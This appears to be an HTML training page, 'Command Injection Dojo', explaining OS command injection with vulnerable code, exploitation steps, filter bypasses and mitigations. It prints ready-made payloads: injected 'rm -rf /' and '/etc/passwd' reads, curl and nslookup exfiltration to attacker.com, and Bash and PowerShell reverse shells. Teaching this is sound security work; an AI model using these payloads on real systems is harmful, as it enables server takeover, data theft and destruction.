@@ -1,0 +1,591 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Command Injection Dojo</title>
+    <style>
+        :root {
+            --hacker-green: #20c20e;
+            --matrix-green: #0fff50;
+            --dark-bg: #121212;
+            --darker-bg: #0a0a0a;
+            --terminal-text: #cccccc;
+            --danger-red: #ff3333;
+            --warning-yellow: #ffcc00;
+        }
+        
+        body {
+            font-family: 'Courier New', monospace;
+            margin: 0;
+            padding: 0;
+            background-color: var(--dark-bg);
+            color: var(--hacker-green);
+            line-height: 1.6;
+        }
+        
+        .header {
+            text-align: center;
+            padding: 30px 20px;
+            background-color: var(--darker-bg);
+            border-bottom: 1px solid var(--hacker-green);
+            box-shadow: 0 0 20px rgba(32, 194, 14, 0.2);
+        }
+        
+        h1 {
+            color: var(--matrix-green);
+            text-shadow: 0 0 5px var(--matrix-green);
+            margin: 0;
+            font-size: 2.5rem;
+        }
+        
+        .tagline {
+            color: var(--terminal-text);
+            margin-top: 10px;
+        }
+        
+        .container {
+            max-width: 1100px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        .section {
+            background-color: var(--darker-bg);
+            border: 1px solid var(--hacker-green);
+            border-radius: 4px;
+            padding: 25px;
+            margin-bottom: 30px;
+            box-shadow: 0 0 15px rgba(32, 194, 14, 0.1);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .section::before {
+            content: ">> ";
+            position: absolute;
+            left: 15px;
+            top: 15px;
+            color: var(--hacker-green);
+        }
+        
+        h2 {
+            color: var(--matrix-green);
+            margin-top: 0;
+            border-bottom: 1px dashed var(--hacker-green);
+            padding-bottom: 10px;
+        }
+        
+        h3 {
+            color: var(--hacker-green);
+        }
+        
+        pre {
+            background-color: rgba(0, 0, 0, 0.5);
+            padding: 15px;
+            border-radius: 4px;
+            overflow-x: auto;
+            border-left: 3px solid var(--danger-red);
+            color: var(--terminal-text);
+        }
+        
+        code {
+            color: var(--matrix-green);
+            background-color: rgba(0, 0, 0, 0.3);
+            padding: 2px 5px;
+            border-radius: 3px;
+        }
+        
+        .danger-zone {
+            border-left: 3px solid var(--danger-red);
+            background-color: rgba(255, 51, 51, 0.05);
+        }
+        
+        .warning-note {
+            border-left: 3px solid var(--warning-yellow);
+            background-color: rgba(255, 204, 0, 0.05);
+        }
+        
+        .tab {
+            overflow: hidden;
+            border: 1px solid var(--hacker-green);
+            background-color: var(--darker-bg);
+            border-radius: 4px 4px 0 0;
+        }
+        
+        .tab button {
+            background-color: inherit;
+            float: left;
+            border: none;
+            outline: none;
+            cursor: pointer;
+            padding: 12px 16px;
+            transition: 0.3s;
+            color: var(--terminal-text);
+            font-family: 'Courier New', monospace;
+        }
+        
+        .tab button:hover {
+            background-color: rgba(32, 194, 14, 0.2);
+        }
+        
+        .tab button.active {
+            background-color: var(--hacker-green);
+            color: black;
+            font-weight: bold;
+        }
+        
+        .tabcontent {
+            display: none;
+            padding: 20px;
+            border: 1px solid var(--hacker-green);
+            border-top: none;
+            border-radius: 0 0 4px 4px;
+            background-color: var(--darker-bg);
+            animation: fadeEffect 0.5s;
+        }
+        
+        @keyframes fadeEffect {
+            from {opacity: 0;}
+            to {opacity: 1;}
+        }
+        
+        .payload-card {
+            background-color: rgba(0, 0, 0, 0.3);
+            padding: 15px;
+            margin: 10px 0;
+            border-radius: 4px;
+            border-left: 3px solid var(--danger-red);
+        }
+        
+        .interactive-lab {
+            background-color: rgba(32, 194, 14, 0.05);
+            padding: 20px;
+            border-radius: 4px;
+            border: 1px dashed var(--hacker-green);
+            margin: 20px 0;
+        }
+        
+        #terminal {
+            background-color: black;
+            color: var(--hacker-green);
+            padding: 20px;
+            border-radius: 4px;
+            font-family: 'Courier New', monospace;
+            height: 300px;
+            overflow-y: auto;
+            border: 1px solid var(--hacker-green);
+        }
+        
+        #terminal-input {
+            background-color: black;
+            color: var(--hacker-green);
+            border: 1px solid var(--hacker-green);
+            width: 80%;
+            padding: 10px;
+            font-family: 'Courier New', monospace;
+            margin-top: 10px;
+        }
+        
+        .blink {
+            animation: blink 1s step-end infinite;
+        }
+        
+        @keyframes blink {
+            from, to { opacity: 1; }
+            50% { opacity: 0; }
+        }
+        
+        .footer {
+            text-align: center;
+            padding: 20px;
+            margin-top: 40px;
+            color: var(--terminal-text);
+            font-size: 0.85em;
+            border-top: 1px dashed var(--hacker-green);
+            background-color: var(--darker-bg);
+        }
+        
+        /* Scanlines effect */
+        body::after {
+            content: "";
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: linear-gradient(
+                rgba(18, 18, 18, 0.2) 50%, 
+                rgba(0, 0, 0, 0.25) 50%
+            );
+            background-size: 100% 4px;
+            pointer-events: none;
+            z-index: -1;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>COMMAND INJECTION DOJO</h1>
+        <p class="tagline">Master the art of system exploitation and defense</p>
+    </div>
+    
+    <div class="container">
+        <!-- Section 1: Description -->
+        <div class="section">
+            <h2>1. What is OS Command Injection?</h2>
+            <p>OS Command Injection is a critical vulnerability where an attacker can execute arbitrary operating system commands on the server hosting a web application.</p>
+            
+            <div class="interactive-lab">
+                <h3>Why It's Dangerous:</h3>
+                <ul>
+                    <li>Full server compromise</li>
+                    <li>Sensitive data exposure</li>
+                    <li>Complete system control</li>
+                    <li>Pivoting to internal networks</li>
+                    <li>Permanent backdoor installation</li>
+                </ul>
+            </div>
+            
+            <div class="warning-note">
+                <pre>// Real-world example:
+$email = $_GET['email'];
+system("mail -s 'Notification' " . $email);
+// Attacker inputs: user@example.com; rm -rf /</pre>
+            </div>
+        </div>
+        
+        <!-- Section 2: Vulnerability Requirements -->
+        <div class="section">
+            <h2>2. Vulnerability Requirements</h2>
+            <p>For successful exploitation, these conditions must exist:</p>
+            
+            <table style="width:100%; border-collapse: collapse; margin:15px 0;">
+                <tr style="border-bottom:1px solid var(--hacker-green);">
+                    <th style="text-align:left; padding:8px;">Requirement</th>
+                    <th style="text-align:left; padding:8px;">Explanation</th>
+                </tr>
+                <tr style="border-bottom:1px solid var(--hacker-green);">
+                    <td style="padding:8px;">User input in system commands</td>
+                    <td style="padding:8px;">Application passes user input to OS commands</td>
+                </tr>
+                <tr style="border-bottom:1px solid var(--hacker-green);">
+                    <td style="padding:8px;">Insufficient input validation</td>
+                    <td style="padding:8px;">No proper filtering of command separators</td>
+                </tr>
+                <tr>
+                    <td style="padding:8px;">Dangerous functions used</td>
+                    <td style="padding:8px;">Direct command execution functions</td>
+                </tr>
+            </table>
+        </div>
+        
+        <!-- Section 3: Root Cause -->
+        <div class="section danger-zone">
+            <h2>3. Why Websites Are Vulnerable</h2>
+            <p>Developers create vulnerabilities by:</p>
+            
+            <div class="payload-card">
+                <h3>Common Mistakes:</h3>
+                <ol>
+                    <li>Using unfiltered user input in system commands</li>
+                    <li>Assuming user input is safe</li>
+                    <li>Using dangerous functions like <code>system()</code>, <code>exec()</code></li>
+                    <li>Not implementing proper output encoding</li>
+                    <li>Blacklisting instead of allowlisting</li>
+                </ol>
+            </div>
+            
+            <pre>// Vulnerable PHP code example:
+$user_input = $_GET['ip'];
+system("ping " . $user_input);
+// Attacker can input: 8.8.8.8; cat /etc/passwd</pre>
+        </div>
+        
+        <!-- Section 4: Whitebox Identification -->
+        <div class="section">
+            <h2>4. Whitebox Code Review</h2>
+            
+            <div class="tab">
+                <button class="tablinks active" onclick="openTab(event, 'lang-php')">PHP</button>
+                <button class="tablinks" onclick="openTab(event, 'lang-py')">Python</button>
+                <button class="tablinks" onclick="openTab(event, 'lang-node')">Node.js</button>
+                <button class="tablinks" onclick="openTab(event, 'lang-java')">Java</button>
+            </div>
+            
+            <div id="lang-php" class="tabcontent" style="display:block;">
+                <h3>PHP Dangerous Functions:</h3>
+                <pre>
+system(), exec(), passthru(), shell_exec(),
+popen(), proc_open(), backticks (``),
+pcntl_exec(), dl()</pre>
+            </div>
+            
+            <div id="lang-py" class="tabcontent">
+                <h3>Python Dangerous Functions:</h3>
+                <pre>
+os.system(), os.popen(), subprocess.call(),
+subprocess.Popen(), subprocess.run(),
+commands.* (deprecated), eval()</pre>
+            </div>
+            
+            <div id="lang-node" class="tabcontent">
+                <h3>Node.js Dangerous Functions:</h3>
+                <pre>
+child_process.exec(), child_process.execSync(),
+child_process.spawn(), child_process.execFile(),
+eval(), vm.runInNewContext()</pre>
+            </div>
+            
+            <div id="lang-java" class="tabcontent">
+                <h3>Java Dangerous Classes:</h3>
+                <pre>
+Runtime.exec(), ProcessBuilder,
+GroovyShell.evaluate(), ScriptEngine.eval()</pre>
+            </div>
+        </div>
+        
+        <!-- Section 5: Basic Exploitation -->
+        <div class="section danger-zone">
+            <h2>5. Exploiting Command Injection</h2>
+            
+            <div class="interactive-lab">
+                <h3>Basic Steps:</h3>
+                <ol>
+                    <li>Find parameter that executes system commands such as:</li> <li>* File operations (file=, dir=, path=)</li>
+<li>* Network operations (host=, ip=, server=)</li>
+<li>* System commands (cmd=, command=, exec=)</li>
+<li>* Process controls (kill=, restart=, stop=)</li>
+                    <li>Test with simple payload: <code>; whoami</code></li>
+                    <li>Identify operating system (Linux/Windows)</li>
+                    <li>Chain commands with separators</li>
+                    <li>Escalate to full system access</li>
+                </ol>
+                
+                <div id="terminal">
+                    <p>Welcome to the Command Injection Simulator!</p>
+                    <p>Try these payloads:</p>
+                    <ul>
+                        <li><code>; whoami</code> - Basic command</li>
+                        <li><code>| ls -la</code> - Pipe output</li>
+                        <li><code>$(cat /etc/passwd)</code> - Command substitution</li>
+                    </ul>
+                    <p>> <span id="terminal-output"></span><span class="blink">_</span></p>
+                </div>
+                <input type="text" id="terminal-input" placeholder="Enter command injection payload..." onkeypress="handleTerminalInput(event)">
+            </div>
+        </div>
+        
+        <!-- Section 6: Advanced Techniques -->
+        <div class="section">
+            <h2>6. Advanced Exploitation</h2>
+            
+            <div class="tab">
+                <button class="tablinks active" onclick="openTab(event, 'adv-blind')">Blind Injection</button>
+                <button class="tablinks" onclick="openTab(event, 'adv-rce')">RCE Chains</button>
+                <button class="tablinks" onclick="openTab(event, 'adv-tty')">TTY Tricks</button>
+            </div>
+            
+            <div id="adv-blind" class="tabcontent" style="display:block;">
+                <h3>Blind Command Injection</h3>
+                <p>When you don't see command output:</p>
+                <div class="payload-card">
+                    <pre># Time-based detection
+; sleep 5
+
+# DNS exfiltration
+; nslookup $(whoami).attacker.com
+
+# HTTP exfiltration
+; curl http://attacker.com/$(cat /etc/passwd | base64)</pre>
+                </div>
+            </div>
+            
+            <div id="adv-rce" class="tabcontent">
+                <h3>Remote Code Execution</h3>
+                <div class="payload-card">
+                    <pre># Reverse shell (Linux)
+; bash -i >& /dev/tcp/attacker.com/4444 0>&1
+
+# Reverse shell (Windows)
+; powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('attacker.com',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"</pre>
+                </div>
+            </div>
+            
+            <div id="adv-tty" class="tabcontent">
+                <h3>TTY Tricks</h3>
+                <div class="payload-card">
+                    <pre># Spawn interactive shell
+; python -c 'import pty; pty.spawn("/bin/bash")'
+; script -qc /bin/bash /dev/null
+
+# Upgrade shell
+; export TERM=xterm
+; stty rows 24 columns 80</pre>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Section 7: Filter Bypass -->
+        <div class="section">
+            <h2>7. Filter Bypass Techniques</h2>
+            
+            <table style="width:100%; border-collapse: collapse; margin:15px 0;">
+                <tr style="border-bottom:1px solid var(--hacker-green);">
+                    <th style="text-align:left; padding:8px;">Filter</th>
+                    <th style="text-align:left; padding:8px;">Bypass Technique</th>
+                    <th style="text-align:left; padding:8px;">Payload Example</th>
+                </tr>
+                <tr style="border-bottom:1px solid var(--hacker-green);">
+                    <td style="padding:8px;">Spaces</td>
+                    <td style="padding:8px;">Tabs, ${IFS}, braces</td>
+                    <td style="padding:8px;"><code>{cat,/etc/passwd}</code></td>
+                </tr>
+                <tr style="border-bottom:1px solid var(--hacker-green);">
+                    <td style="padding:8px;">Blacklisted words</td>
+                    <td style="padding:8px;">Environment variables, encoding</td>
+                    <td style="padding:8px;"><code>${PATH:0:1}bin${PATH:0:1}ls</code></td>
+                </tr>
+                <tr style="border-bottom:1px solid var(--hacker-green);">
+                    <td style="padding:8px;">Special chars</td>
+                    <td style="padding:8px;">Hex/octal encoding</td>
+                    <td style="padding:8px;"><code>\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64</code></td>
+                </tr>
+                <tr>
+                    <td style="padding:8px;">Command blocks</td>
+                    <td style="padding:8px;">Alternative separators</td>
+                    <td style="padding:8px;"><code>%0aid</code> (newline)</td>
+                </tr>
+            </table>
+        </div>
+        
+        <!-- Section 8: Payload List -->
+        <div class="section">
+            <h2>8. Payload Arsenal</h2>
+            
+            <div class="tab">
+                <button class="tablinks active" onclick="openTab(event, 'os-linux')">Linux</button>
+                <button class="tablinks" onclick="openTab(event, 'os-windows')">Windows</button>
+            </div>
+            
+            <div id="os-linux" class="tabcontent" style="display:block;">
+                <div class="payload-card">
+                    <h3>File Read</h3>
+                    <pre>cat /etc/passwd
+less /etc/shadow
+head -n 10 /var/log/auth.log</pre>
+                </div>
+                <div class="payload-card">
+                    <h3>System Info</h3>
+                    <pre>uname -a
+id
+whoami
+ps aux</pre>
+                </div>
+            </div>
+            
+            <div id="os-windows" class="tabcontent">
+                <div class="payload-card">
+                    <h3>File Read</h3>
+                    <pre>type C:\Windows\win.ini
+more C:\boot.ini</pre>
+                </div>
+                <div class="payload-card">
+                    <h3>System Info</h3>
+                    <pre>whoami
+systeminfo
+net user
+ipconfig /all</pre>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Section 9: Mitigation -->
+        <div class="section">
+            <h2>9. Mitigation Strategies</h2>
+            
+            <div class="interactive-lab">
+                <h3>Defensive Measures:</h3>
+                <ul>
+                    <li><strong>Input Validation:</strong> Strict allowlisting of characters</li>
+                    <li><strong>Parameterized APIs:</strong> Use subprocess modules safely</li>
+                    <li><strong>Sandboxing:</strong> Run with least privileges</li>
+                    <li><strong>Secure Functions:</strong> Prefer safe alternatives</li>
+                    <li><strong>Output Encoding:</strong> Properly escape output</li>
+                </ul>
+            </div>
+            
+            <div class="warning-note">
+                <h3>Secure Coding Examples:</h3>
+                <pre># Python safe example
+import subprocess
+subprocess.run(['ping', '-c', '4', user_input], shell=False)
+
+// PHP safe example
+escapeshellarg($user_input);</pre>
+            </div>
+        </div>
+        
+        <!-- Section 10: Resources -->
+        <div class="section">
+            <h2>10. Additional Resources</h2>
+            
+            <div class="payload-card">
+                <h3>Learning Materials:</h3>
+                <ul>
+                    <li><a href="https://owasp.org/www-community/attacks/Command_Injection" style="color:var(--matrix-green);">OWASP Command Injection</a></li>
+                    <li><a href="https://portswigger.net/web-security/os-command-injection" style="color:var(--matrix-green);">PortSwigger Command Injection</a></li>
+                    <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection" style="color:var(--matrix-green);">PayloadsAllTheThings</a></li>
+                    <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html" style="color:var(--matrix-green);">OWASP Defense Cheat Sheet</a></li>
+                </ul>
+            </div>
+        </div>
+    </div>
+    
+    <footer class="footer">
+        <p>Command Injection Dojo - Train responsibly. Only test on systems you own or have permission to test.</p>
+        <p>Remember: With great power comes great responsibility.</p>
+    </footer>
+
+    <script>
+        // Tab functionality
+        function openTab(evt, tabName) {
+            var i, tabcontent, tablinks;
+            tabcontent = document.getElementsByClassName("tabcontent");
+            for (i = 0; i < tabcontent.length; i++) {
+                tabcontent[i].style.display = "none";
+            }
+            tablinks = document.getElementsByClassName("tablinks");
+            for (i = 0; i < tablinks.length; i++) {
+                tablinks[i].className = tablinks[i].className.replace(" active", "");
+            }
+            document.getElementById(tabName).style.display = "block";
+            evt.currentTarget.className += " active";
+        }
+        
+        // Terminal simulator
+        function handleTerminalInput(e) {
+            if (e.key === 'Enter') {
+                const input = document.getElementById('terminal-input');
+                const command = input.value;
+                const output = document.getElementById('terminal-output');
+                
+                output.innerHTML += command + '<br>';
+                
+                if (command.includes('whoami')) {
+                    output.innerHTML += '> root<br>';
+                } else if (command.includes('ls')) {
+                    output.innerHTML += '> index.php<br>config.inc.php<br>secret.txt<br>';
+                } else if (command.includes('cat')) {
+                    output.innerHTML += '> root:x:0:0:root:/root:/bin/bash<br>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br>';
+                } else {
+                    output.innerHTML += '> Command executed<br>';
+                }
+                
+                input.value = '';
+                document.getElementById('terminal').scrollTop = document.getElementById('terminal').scrollHeight;
+            }
+        }
+    </script>
+</body>
+</html>
